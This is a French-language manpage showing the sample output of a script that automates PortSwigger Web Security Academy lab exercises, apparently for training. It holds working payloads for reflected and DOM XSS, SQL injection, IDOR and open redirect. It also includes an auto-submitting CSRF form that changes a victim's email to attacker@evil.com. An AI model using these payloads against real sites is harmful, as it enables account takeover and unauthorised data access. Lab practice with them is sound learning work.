# MANPAGE

Voici un **exemple exhaustif d’exécution du script** pour les challenges PortSwigger Essential Skills, avec la sortie typique pour chaque fonction, le comportement attendu et les instructions de validation :

---

### Lancement du script

```bash
chmod +x script.sh
./script.sh
```

---

### 1. XSS (Cross-Site Scripting)

```
------------------------------------------------------
[XSS] Analyse, attaque et contrôle
  [+] Payload reflété : https://<your-lab>.web-security-academy.net/?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
      => Testez dans le navigateur, cherchez une alerte JS.
  [-] Non reflété : https://<your-lab>.web-security-academy.net/?search=%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
  [-] Non reflété : https://<your-lab>.web-security-academy.net/?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
  [Contrôle] : Si une alerte JS apparaît, la faille XSS est confirmée.
```
**Comportement attendu** :  
- Le script teste plusieurs payloads XSS dans le paramètre `search`.
- Si un payload est reflété, ouvrez le lien dans un navigateur : une alerte JS doit apparaître ([3][6]).

---

### 2. DOM XSS

```
------------------------------------------------------
[DOM XSS] Analyse, attaque et contrôle
  [!] Source location.search détectée.
  [PoC] https://<your-lab>.web-security-academy.net/?search=%3Cimg%20src%3Dx%20onerror%3Dalert('domxss')%3E
  [Contrôle] : Ouvrez ce lien dans un navigateur, si une alerte JS apparaît la faille est confirmée.
```
**Comportement attendu** :  
- Le script détecte une source DOM XSS (`location.search`) et propose un lien PoC.
- Ouvrez le lien dans un navigateur pour valider l’exploitabilité.

---

### 3. SQL Injection (SQLi)

```
------------------------------------------------------
[SQLi] Analyse, attaque et contrôle
  [+] Résultat anormal (possible Boolean-based SQLi) : https://<your-lab>.web-security-academy.net/?category=%27%20OR%201%3D1--
  [-] Pas d'indicateur SQLi évident : https://<your-lab>.web-security-academy.net/?category=%27%20OR%20%27a%27%3D%27a
  [-] Pas d'indicateur SQLi évident : https://<your-lab>.web-security-academy.net/?category=%27%20OR%20SLEEP%285%29--
  [Contrôle] : Si vous obtenez un accès non autorisé ou un délai, la faille SQLi est probable.
```
**Comportement attendu** :  
- Le script injecte des payloads SQLi dans le paramètre `category`.
- Si la réponse change ou s’il y a un délai, la faille est probable ([2]).

---

### 4. CSRF (Cross-Site Request Forgery)

```
------------------------------------------------------
[CSRF] Analyse, attaque et contrôle
  [ALERTE] Aucun token CSRF détecté !
  => Génération d'une PoC à tester dans le navigateur :
<!DOCTYPE html>
<html>
  <body>
    <form action="https://<your-lab>.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
  [Contrôle] : Si l'action est réalisée sans token, la faille CSRF est confirmée.
```
**Comportement attendu** :  
- Le script détecte l’absence de token CSRF et génère une PoC HTML.
- Ouvrez la PoC dans un navigateur connecté : si l’action se réalise, la faille est confirmée.

---

### 5. IDOR (Insecure Direct Object Reference)

```
------------------------------------------------------
[IDOR] Analyse, attaque et contrôle
  [+] Accès à carlos possible : https://<your-lab>.web-security-academy.net/my-account?id=carlos
  [+] Accès à administrator possible : https://<your-lab>.web-security-academy.net/my-account?id=administrator
  [-] Accès refusé ou page vide : https://<your-lab>.web-security-academy.net/my-account?id=1
  [-] Accès refusé ou page vide : https://<your-lab>.web-security-academy.net/my-account?id=2
  [Contrôle] : Si vous accédez aux données d'un autre utilisateur, la faille IDOR est confirmée.
```
**Comportement attendu** :  
- Le script tente d’accéder à différents comptes via l’ID dans l’URL.
- Si vous voyez les infos d’un autre utilisateur, la faille IDOR est confirmée.

---

### 6. Open Redirect

```
------------------------------------------------------
[Open Redirect] Analyse, attaque et contrôle
  [+] Redirection externe détectée : https://<your-lab>.web-security-academy.net/redirect?url=https%3A%2F%2Fevil.com
  [-] Pas de redirection externe : https://<your-lab>.web-security-academy.net/redirect?url=%2F%5Cevil.com
  [Contrôle] : Si la redirection externe fonctionne, la faille est confirmée.
```
**Comportement attendu** :  
- Le script teste plusieurs payloads dans le paramètre de redirection.
- Si la redirection externe fonctionne (header Location), la faille est confirmée.

---

### 7. Synthèse

```
------------------------------------------------------
[SYNTHÈSE ESSENTIAL SKILLS]
1. Pour chaque type de vulnérabilité, le script propose une analyse, une attaque et un contrôle.
2. Pour XSS/DOM XSS, ouvrez les liens dans un navigateur pour valider l'exploit.
3. Pour CSRF, testez la PoC HTML dans le navigateur connecté.
4. Pour SQLi et IDOR, analysez les réponses pour détecter un comportement anormal.
5. Pour Open Redirect, vérifiez la présence du header Location.
6. Utilisez Burp Suite pour automatiser et approfondir l'analyse.
Documentation PortSwigger : https://portswigger.net/web-security
------------------------------------------------------
```

---
